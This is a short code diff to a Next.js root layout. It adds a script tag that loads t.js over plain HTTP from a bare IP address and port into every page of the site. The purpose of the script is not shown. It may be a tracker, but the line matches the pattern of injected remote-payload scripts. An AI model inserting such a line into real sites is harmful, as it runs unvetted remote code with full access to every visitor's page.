@@ -58,6 +58,7 @@ export default function RootLayout({
 
         <FloatingChatWrapper />
         <BackToTop accentColor="#6366f1" />
+        <Script defer data-site="protofast.app" src="http://31.97.56.148:3098/t.js" strategy="afterInteractive" />
       </body>
     </html>
   );
